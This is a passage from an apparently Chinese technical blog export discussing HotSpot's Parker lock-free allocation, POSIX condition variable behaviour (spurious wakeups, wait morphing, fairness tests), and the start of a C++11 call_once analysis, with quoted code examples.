<li><a href="http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/share/vm/runtime/park.hpp" target="_blank" rel="noopener">http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/share/vm/runtime/park.hpp</a></li>
<li><a href="http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/share/vm/runtime/park.cpp" target="_blank" rel="noopener">http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/share/vm/runtime/park.cpp</a></li>
<li><a href="http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/os/linux/vm/os_linux.hpp" target="_blank" rel="noopener">http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/os/linux/vm/os_linux.hpp</a></li>
<li><a href="http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/os/linux/vm/os_linux.cpp" target="_blank" rel="noopener">http://hg.openjdk.java.net/jdk7/jdk7/hotspot/file/81d815b05abb/src/os/linux/vm/os_linux.cpp</a></li>
</ul>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><p>Parker类在分配内存时，使用了一个技巧，重载了new函数来实现了cache line对齐。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// We use placement-new to force ParkEvent instances to be</span></span><br><span class="line"><span class="comment">// aligned on 256-byte address boundaries.  This ensures that the least</span></span><br><span class="line"><span class="comment">// significant byte of a ParkEvent address is always 0.</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="keyword">operator</span> <span class="title">new</span> <span class="params">(<span class="keyword">size_t</span> sz)</span> </span>;</span><br></pre></td></tr></table></figure>
<p>Parker里使用了一个无锁的队列在分配释放Parker实例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> Parker::ListLock = <span class="number">0</span> ;</span><br><span class="line">Parker * <span class="keyword">volatile</span> Parker::FreeList = <span class="literal">NULL</span> ;</span><br><span class="line"> </span><br><span class="line"><span class="function">Parker * <span class="title">Parker::Allocate</span> <span class="params">(JavaThread * t)</span> </span>&#123;</span><br><span class="line">  guarantee (t != <span class="literal">NULL</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">  Parker * p ;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Start by trying to recycle an existing but unassociated</span></span><br><span class="line">  <span class="comment">// Parker from the global free list.</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    p = FreeList ;</span><br><span class="line">    <span class="keyword">if</span> (p  == <span class="literal">NULL</span>) <span class="keyword">break</span> ;</span><br><span class="line">    <span class="comment">// 1: Detach</span></span><br><span class="line">    <span class="comment">// Tantamount to p = Swap (&amp;FreeList, NULL)</span></span><br><span class="line">    <span class="keyword">if</span> (Atomic::cmpxchg_ptr (<span class="literal">NULL</span>, &amp;FreeList, p) != p) &#123;</span><br><span class="line">       <span class="keyword">continue</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// We've detached the list.  The list in-hand is now</span></span><br><span class="line">    <span class="comment">// local to this thread.   This thread can operate on the</span></span><br><span class="line">    <span class="comment">// list without risk of interference from other threads.</span></span><br><span class="line">    <span class="comment">// 2: Extract -- pop the 1st element from the list.</span></span><br><span class="line">    Parker * List = p-&gt;FreeNext ;</span><br><span class="line">    <span class="keyword">if</span> (List == <span class="literal">NULL</span>) <span class="keyword">break</span> ;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 3: Try to reattach the residual list</span></span><br><span class="line">        guarantee (List != <span class="literal">NULL</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">        Parker * Arv =  (Parker *) Atomic::cmpxchg_ptr (List, &amp;FreeList, <span class="literal">NULL</span>) ;</span><br><span class="line">        <span class="keyword">if</span> (Arv == <span class="literal">NULL</span>) <span class="keyword">break</span> ;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// New nodes arrived.  Try to detach the recent arrivals.</span></span><br><span class="line">        <span class="keyword">if</span> (Atomic::cmpxchg_ptr (<span class="literal">NULL</span>, &amp;FreeList, Arv) != Arv) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        guarantee (Arv != <span class="literal">NULL</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">        <span class="comment">// 4: Merge Arv into List</span></span><br><span class="line">        Parker * Tail = List ;</span><br><span class="line">        <span class="keyword">while</span> (Tail-&gt;FreeNext != <span class="literal">NULL</span>) Tail = Tail-&gt;FreeNext ;</span><br><span class="line">        Tail-&gt;FreeNext = Arv ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span> ;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    guarantee (p-&gt;AssociatedWith == <span class="literal">NULL</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Do this the hard way -- materialize a new Parker..</span></span><br><span class="line">    <span class="comment">// In rare cases an allocating thread might detach</span></span><br><span class="line">    <span class="comment">// a long list -- installing null into FreeList --and</span></span><br><span class="line">    <span class="comment">// then stall.  Another thread calling Allocate() would see</span></span><br><span class="line">    <span class="comment">// FreeList == null and then invoke the ctor.  In this case we</span></span><br><span class="line">    <span class="comment">// end up with more Parkers in circulation than we need, but</span></span><br><span class="line">    <span class="comment">// the race is rare and the outcome is benign.</span></span><br><span class="line">    <span class="comment">// Ideally, the # of extant Parkers is equal to the</span></span><br><span class="line">    <span class="comment">// maximum # of threads that existed at any one time.</span></span><br><span class="line">    <span class="comment">// Because of the race mentioned above, segments of the</span></span><br><span class="line">    <span class="comment">// freelist can be transiently inaccessible.  At worst</span></span><br><span class="line">    <span class="comment">// we may end up with the # of Parkers in circulation</span></span><br><span class="line">    <span class="comment">// slightly above the ideal.</span></span><br><span class="line">    p = <span class="keyword">new</span> Parker() ;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;AssociatedWith = t ;          <span class="comment">// Associate p with t</span></span><br><span class="line">  p-&gt;FreeNext       = <span class="literal">NULL</span> ;</span><br><span class="line">  <span class="keyword">return</span> p ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Parker::Release</span> <span class="params">(Parker * p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (p == <span class="literal">NULL</span>) <span class="keyword">return</span> ;</span><br><span class="line">  guarantee (p-&gt;AssociatedWith != <span class="literal">NULL</span>, <span class="string">"invariant"</span>) ;</span><br><span class="line">  guarantee (p-&gt;FreeNext == <span class="literal">NULL</span>      , <span class="string">"invariant"</span>) ;</span><br><span class="line">  p-&gt;AssociatedWith = <span class="literal">NULL</span> ;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// Push p onto FreeList</span></span><br><span class="line">    Parker * List = FreeList ;</span><br><span class="line">    p-&gt;FreeNext = List ;</span><br><span class="line">    <span class="keyword">if</span> (Atomic::cmpxchg_ptr (p, &amp;FreeList, List) == List) <span class="keyword">break</span> ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结与扯谈"><a href="#总结与扯谈" class="headerlink" title="总结与扯谈"></a>总结与扯谈</h2><p><strong>JUC(Java Util Concurrency)仅用简单的park, unpark和CAS指令就实现了各种高级同步数据结构，而且效率很高，令人惊叹。</strong></p>
<p>在C++程序员各种自制轮子的时候，Java程序员则有很丰富的并发数据结构，如lock，latch，queue，map等信手拈来。</p>
<p>要知道像C++直到C++11才有标准的线程库，同步原语，但离高级的并发数据结构还有很远。boost库有提供一些线程，同步相关的类，但也是很简单的。Intel的tbb有一些高级的并发数据结构，但是国内boost都用得少，更别说tbb了。</p>
<p>最开始研究无锁算法的是C/C++程序员，但是后来很多Java程序员，或者类库开始自制各种高级的并发数据结构，经常可以看到有分析Java并发包的文章。反而C/C++程序员总是在分析无锁的队列算法。高级的并发数据结构，比如并发的HashMap，没有看到有相关的实现或者分析的文章。在C++11之后，这种情况才有好转。</p>
<p>因为正确高效实现一个Concurrent Hash Map是很困难的，要对内存CPU有深刻的认识，而且还要面对CPU不断升级带来的各种坑。</p>
<p>我认为真正值得信赖的C++并发库，只有Intel的tbb和微软的PPL。</p>
<p><a href="https://software.intel.com/en-us/node/506042" target="_blank" rel="noopener">https://software.intel.com/en-us/node/506042</a>     Intel® Threading Building Blocks </p>
<p><a href="http://msdn.microsoft.com/en-us/library/dd492418.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/dd492418.aspx</a>   Parallel Patterns Library (PPL)</p>
<p>另外FaceBook也开源了一个C++的类库，里面也有并发数据结构。</p>
<p><a href="https://github.com/facebook/folly" target="_blank" rel="noopener">https://github.com/facebook/folly</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>并行编程之条件变量（posix condition variables）</title>
    <url>/posix-condition-variables/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在整理Java LockSupport.park()的东东，看到了个”Spurious wakeup”，重新梳理下。</p>
<p>首先来个《UNIX环境高级编程》里的例子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg</span> *<span class="title">m_next</span>;</span></span><br><span class="line">	<span class="comment">/* ... more stuff here ... */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg</span> *<span class="title">workq</span>;</span></span><br><span class="line"><span class="keyword">pthread_cond_t</span> qready = PTHREAD_COND_INITIALIZER;</span><br><span class="line"><span class="keyword">pthread_mutex_t</span> qlock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_msg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg</span> *<span class="title">mp</span>;</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		pthread_mutex_lock(&amp;qlock);</span><br><span class="line">		<span class="keyword">while</span> (workq == <span class="literal">NULL</span>)</span><br><span class="line">			pthread_cond_wait(&amp;qready, &amp;qlock);</span><br><span class="line">		mp = workq;</span><br><span class="line">		workq = mp-&gt;m_next;</span><br><span class="line">		pthread_mutex_unlock(&amp;qlock);</span><br><span class="line">		<span class="comment">/* now process the message mp */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enqueue_msg</span><span class="params">(struct msg *mp)</span> </span>&#123;</span><br><span class="line">	pthread_mutex_lock(&amp;qlock);</span><br><span class="line">	mp-&gt;m_next = workq;</span><br><span class="line">	workq = mp;</span><br><span class="line">	pthread_mutex_unlock(&amp;qlock);</span><br><span class="line">	pthread_cond_signal(&amp;qready);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个简单的消息生产者和消费者的代码。它们之间用condition同步。<br>这个代码最容易让人搞混的是process_msg函数里的pthread_mutex_lock 和 pthread_mutex_unlock 是一对函数调用，前面加锁，后面解锁。的确，是加锁解锁，但是它们两不是一对的。它们的另一半在pthread_cond_wait函数里。</p>
<p>pthread_cond_wait函数可以认为它做了三件事：</p>
<ul>
<li>把自身线程放到condition的等待队列里，把mutex解锁；</li>
<li>等待被唤醒（当其它线程调用pthread_cond_signal或者pthread_cond_broadcast时）；</li>
<li>被唤醒之后，对metex加锁，再返回。</li>
</ul>
<p>mutex和condition实际上是绑定在一起的，一个condition只能对应一个mutex。在Java的代码里，Condition对象只能通过lock.newCondition()的函数来获取。</p>
<h2 id="Spurious-wakeup"><a href="#Spurious-wakeup" class="headerlink" title="Spurious wakeup"></a>Spurious wakeup</h2><p>所谓的spurious wakeup，指的是一个线程调用pthread_cond_signal()，却有可能不止一个线程被唤醒。为什么会出现这种情况？wiki和其它的一些文档都只是说在多核的情况下，简化实现允许出现这种spurious wakeup。。</p>
<p>在man文档里给出了一个可能的实现，然后解析为什么会出现。</p>
<p>假定有三个线程，线程A正在执行pthread_cond_wait，线程B正在执行pthread_cond_signal，线程C正准备执行pthread_cond_wait函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pthread_cond_wait(mutex, cond):</span><br><span class="line">    value = cond-&gt;value; <span class="comment">/* 1 */</span></span><br><span class="line">    pthread_mutex_unlock(mutex); <span class="comment">/* 2 */</span></span><br><span class="line">    pthread_mutex_lock(cond-&gt;mutex); <span class="comment">/* 10 */</span></span><br><span class="line">    <span class="keyword">if</span> (value == cond-&gt;value) &#123; <span class="comment">/* 11 */</span></span><br><span class="line">        me-&gt;next_cond = cond-&gt;waiter;</span><br><span class="line">        cond-&gt;waiter = me;</span><br><span class="line">        pthread_mutex_unlock(cond-&gt;mutex);</span><br><span class="line">        unable_to_run(me);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        pthread_mutex_unlock(cond-&gt;mutex); <span class="comment">/* 12 */</span></span><br><span class="line">    pthread_mutex_lock(mutex); <span class="comment">/* 13 */</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">pthread_cond_signal(cond):</span><br><span class="line">    pthread_mutex_lock(cond-&gt;mutex); <span class="comment">/* 3 */</span></span><br><span class="line">    cond-&gt;value++; <span class="comment">/* 4 */</span></span><br><span class="line">    <span class="keyword">if</span> (cond-&gt;waiter) &#123; <span class="comment">/* 5 */</span></span><br><span class="line">        sleeper = cond-&gt;waiter; <span class="comment">/* 6 */</span></span><br><span class="line">        cond-&gt;waiter = sleeper-&gt;next_cond; <span class="comment">/* 7 */</span></span><br><span class="line">        able_to_run(sleeper); <span class="comment">/* 8 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_unlock(cond-&gt;mutex); <span class="comment">/* 9 */</span></span><br></pre></td></tr></table></figure>
<p>线程A执行了第1,2步，这时它释放了mutex，然后线程B拿到了这个mutext，并且pthread_cond_signal函数时执行并返回了。于是线程B就是一个所谓的“spurious wakeup”。</p>
<p>为什么pthread_cond_wait函数里一进入，就释放了mutex？没有找到什么解析。。</p>
<p>查看了glibc的源代码，大概可以看出上面的一些影子，但是太复杂了，也没有搞明白为什么。。</p>
<ul>
<li>/build/buildd/eglibc-2.19/nptl/pthread_cond_wait.c</li>
<li>/build/buildd/eglibc-2.19/nptl/pthread_cond_signal.c</li>
</ul>
<p>不过从上面的解析，可以发现《UNIX高级编程》里的说明是错误的（可能是因为太久了）。</p>
<blockquote>
<p>The  caller passes it locked to the function, which then atomically places the calling thread on the list of threads waiting for the condition and unlocks the mutex. </p>
</blockquote>
<p>上面的伪代码，一进入pthread_cond_wait函数就释放了mutex，明显和书里的不一样。</p>
<h2 id="wait-morphing优化"><a href="#wait-morphing优化" class="headerlink" title="wait morphing优化"></a>wait morphing优化</h2><p>在《UNIX环境高级编程》的示例代码里，是先调用pthread_mutex_unlock，再调用pthread_cond_signal。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enqueue_msg</span><span class="params">(struct msg *mp)</span> </span>&#123;</span><br><span class="line">	pthread_mutex_lock(&amp;qlock);</span><br><span class="line">	mp-&gt;m_next = workq;</span><br><span class="line">	workq = mp;</span><br><span class="line">	pthread_mutex_unlock(&amp;qlock);</span><br><span class="line">	pthread_cond_signal(&amp;qready);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有的地方给出的是先调用pthread_cond_signal，再调用pthread_mutex_unlock：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enqueue_msg</span><span class="params">(struct msg *mp)</span> </span>&#123;</span><br><span class="line">	pthread_mutex_lock(&amp;qlock);</span><br><span class="line">	mp-&gt;m_next = workq;</span><br><span class="line">	workq = mp;</span><br><span class="line">	pthread_cond_signal(&amp;qready);</span><br><span class="line">	pthread_mutex_unlock(&amp;qlock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先unlock再signal，这有个好处，就是调用enqueue_msg的线程可以再次参与mutex的竞争中，这样意味着可以连续放入多个消息，这个可能会提高效率。类似Java里ReentrantLock的非公平模式。<br>网上有些文章说，先singal再unlock，有可能会出现一种情况是被singal唤醒的线程会因为不能马上拿到mutex（还没被释放），从而会再次休眠，这样影响了效率。从而会有一个叫“wait morphing”优化，就是如果线程被唤醒但是不能获取到mutex,则线程被转移(morphing)到mutex的等待队列里。</p>
<p>但是我查看了下glibc的源代码，貌似没有发现有这种“wait morphing”优化。</p>
<p>man文档里提到：</p>
<blockquote>
<p>The pthread_cond_broadcast() or pthread_cond_signal() functions may be called by a thread whether or not it currently owns the mutex that  threads  calling  pthread_cond_wait()  or pthread_cond_timedwait() have associated with the condition variable during their waits; however, if predictable scheduling behavior is required, then that mutex shall be locked by the thread calling pthread_cond_broadcast() or pthread_cond_signal().</p>
</blockquote>
<p>可见在调用singal之前，可以不持有mutex，除非是“predictable scheduling”，可预测的调度行为。这种可能是实时系统才有这种严格的要求。</p>
<h2 id="为什么要用while循环来判断条件是否成立？"><a href="#为什么要用while循环来判断条件是否成立？" class="headerlink" title="为什么要用while循环来判断条件是否成立？"></a>为什么要用while循环来判断条件是否成立？</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (workq == <span class="literal">NULL</span>)</span><br><span class="line">	pthread_cond_wait(&amp;qready, &amp;qlock);</span><br></pre></td></tr></table></figure>
<p>而不用if来判断？</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (workq == <span class="literal">NULL</span>)</span><br><span class="line">	pthread_cond_wait(&amp;qready, &amp;qlock);</span><br></pre></td></tr></table></figure>
<p><strong>一个原因是spurious wakeup，但即使没有spurious wakeup，也是要用While来判断的。</strong></p>
<p>比如线程A，线程B在pthread_cond_wait函数中等待，然后线程C把消息放到队列里，再调用pthread_cond_broadcast，然后线程A先获取到mutex，处理完消息完后，这时workq就变成NULL了。这时线程B才获取到mutex，那么这时实际上是没有资源供线程B使用的。所以从pthread_cond_wait函数返回之后，还是要判断条件是否成功，如果成立，再进行处理。</p>
<h2 id="pthread-cond-signal和pthread-cond-broadcast"><a href="#pthread-cond-signal和pthread-cond-broadcast" class="headerlink" title="pthread_cond_signal和pthread_cond_broadcast"></a>pthread_cond_signal和pthread_cond_broadcast</h2><p>在这篇文章里，<a href="http://www.cppblog.com/Solstice/archive/2013/09/09/203094.html" target="_blank" rel="noopener">http://www.cppblog.com/Solstice/archive/2013/09/09/203094.html</a></p>
<p>给出的示例代码7里，认为调用pthread_cond_broadcast来唤醒所有的线程是比较好的写法。但是我认为pthread_cond_signal和pthread_cond_broadcast是两个不同东东，不能简单合并在同一个函数调用。只唤醒一个效率和唤醒全部等待线程的效率显然不能等同。典型的condition是用CLH或者MCS来实现的，要通知所有的线程，则要历遍链表，显然效率降低。另外，C++11里的condition_variable也提供了notify_one函数。</p>
<p><a href="http://en.cppreference.com/w/cpp/thread/condition_variable/notify_one" target="_blank" rel="noopener">http://en.cppreference.com/w/cpp/thread/condition_variable/notify_one</a></p>
<h2 id="mutex，condition是不是公平-fair-的？"><a href="#mutex，condition是不是公平-fair-的？" class="headerlink" title="mutex，condition是不是公平(fair)的？"></a>mutex，condition是不是公平(fair)的？</h2><p>这个在参考文档里没有说明，在网上找了些资料，也没有什么明确的答案。</p>
<p>我写了个代码测试，发现mutex是公平的。condition的测试结果也是差不多。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> mutexCount = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mutexFairTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> localCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		pthread_mutex_lock(&amp;lock);</span><br><span class="line">		__sync_fetch_and_add(&amp;mutexCount, <span class="number">1</span>);</span><br><span class="line">		localCount += <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(mutexCount &gt; <span class="number">100000000</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		pthread_mutex_unlock(&amp;lock);</span><br><span class="line">	&#125;</span><br><span class="line">	pthread_mutex_unlock(&amp;lock);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"localCount:%d\n"</span>, localCount);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	pthread_mutex_lock(&amp;lock);</span><br><span class="line">	pthread_create(<span class="keyword">new</span> <span class="keyword">pthread_t</span>, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))&amp;mutexFairTest, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_create(<span class="keyword">new</span> <span class="keyword">pthread_t</span>, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))&amp;mutexFairTest, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_create(<span class="keyword">new</span> <span class="keyword">pthread_t</span>, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))&amp;mutexFairTest, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_create(<span class="keyword">new</span> <span class="keyword">pthread_t</span>, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))&amp;mutexFairTest, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_create(<span class="keyword">new</span> <span class="keyword">pthread_t</span>, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))&amp;mutexFairTest, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_create(<span class="keyword">new</span> <span class="keyword">pthread_t</span>, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))&amp;mutexFairTest, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_mutex_unlock(&amp;lock);</span><br><span class="line"> </span><br><span class="line">	sleep(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localCount:16930422</span><br><span class="line">localCount:16525616</span><br><span class="line">localCount:16850294</span><br><span class="line">localCount:16129844</span><br><span class="line">localCount:17329693</span><br><span class="line">localCount:16234137</span><br></pre></td></tr></table></figure>
<p>还特意在一个单CPU的虚拟机上测试了下。输出的结果差不多。操作系统是ububtu14.04。</p>
<h2 id="连续调用pthread-cond-signal，会唤醒多少次-多少个线程？"><a href="#连续调用pthread-cond-signal，会唤醒多少次-多少个线程？" class="headerlink" title="连续调用pthread_cond_signal，会唤醒多少次/多少个线程？"></a>连续调用pthread_cond_signal，会唤醒多少次/多少个线程？</h2><p>比如线程a,b 在调用pthread_cond_wait之后等待，然后线程c, d同时调用pthread_cond_signal，那么a, b线程是否都能被唤醒？</p>
<p>会不会出现c, d, a 这种调用顺序，然后b一直在等待，然后死锁了？</p>
<p>根据文档：</p>
<blockquote>
<p>The pthread_cond_signal() function shall unblock at least one of the threads that are blocked on the specified condition variable cond (if any threads are blocked on cond).</p>
</blockquote>
<p><strong>因此，如果有线程已经在调用pthread_cond_wait等待的情况下，pthread_cond_signal调用至少会唤醒等待中的一个线程。</strong></p>
<p>所以不会出现上面的线程b一直等待的情况。</p>
<p>但是，我们再仔细考虑下：</p>
<p><strong>如何确认线程a, b 调用pthread_cond_wait完成了？还是只是刚切换到内核态？显然是没有办法知道的。</strong></p>
<p>所以，我们平时编程肯定不会写这样的代码，应该是共享变量，在获取到锁之后，再修改变量。这样子来做同步。参考上面《UNIX环境高级编程》的例子。</p>
<p>不过，这个问题也是挺有意思的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://en.wikipedia.org/wiki/Spurious_wakeup" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/Spurious_wakeup</a></li>
<li><a href="http://siwind.iteye.com/blog/1469216" target="_blank" rel="noopener">http://siwind.iteye.com/blog/1469216</a></li>
<li><a href="http://www.cppblog.com/Solstice/archive/2013/09/09/203094.html" target="_blank" rel="noopener">http://www.cppblog.com/Solstice/archive/2013/09/09/203094.html</a></li>
<li><a href="http://www.cs.cmu.edu/afs/cs/academic/class/15492-f07/www/pthreads.html" target="_blank" rel="noopener">http://www.cs.cmu.edu/afs/cs/academic/class/15492-f07/www/pthreads.html</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
        <tag>posix</tag>
        <tag>condition</tag>
      </tags>
  </entry>
  <entry>
    <title>C++11中once_flag，call_once实现分析</title>
    <url>/cpp11-once_flag-call_once/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文的分析基于llvm的libc++，而不是gun的libstdc++，因为libstdc++的代码里太多宏了，看起来蛋疼。</p>
<p>在多线程编程中，有一个常见的情景是某个任务只需要执行一次。在C++11中提供了很方便的辅助类once_flag，call_once。</p>
<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首先来看一下once_flag和call_once的声明：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">once_flag</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">constexpr</span> <span class="title">once_flag</span><span class="params">()</span> <span class="keyword">noexcept</span></span>;</span><br><span class="line">    once_flag(<span class="keyword">const</span> once_flag&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    once_flag&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> once_flag&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">Callable</span>, <span class="title">class</span> ...<span class="title">Args</span>&gt;</span></span><br><span class="line"><span class="class">  <span class="title">void</span> <span class="title">call_once</span>(<span class="title">once_flag</span>&amp; <span class="title">flag</span>, <span class="title">Callable</span>&amp;&amp; <span class="title">func</span>, <span class="title">Args</span>&amp;&amp;... <span class="title">args</span>);</span></span><br><span class="line"> </span><br><span class="line">&#125;  <span class="comment">// std</span></span><br></pre></td></tr></table></figure>
<p>可以看到once_flag是不允许修改的，拷贝构造函数和operator=函数都声明为delete，这样防止程序员乱用。<br>另外，call_once也是很简单的，只要传进一个once_flag，回调函数，和参数列表就可以了。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>看一个示例：</p>
<p><a href="http://en.cppreference.com/w/cpp/thread/call_once" target="_blank" rel="noopener">http://en.cppreference.com/w/cpp/thread/call_once</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">std</span>::once_flag flag;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_once</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::call_once(flag, []()&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Called once"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t1</span><span class="params">(do_once)</span></span>;</span><br><span class="line">    <span 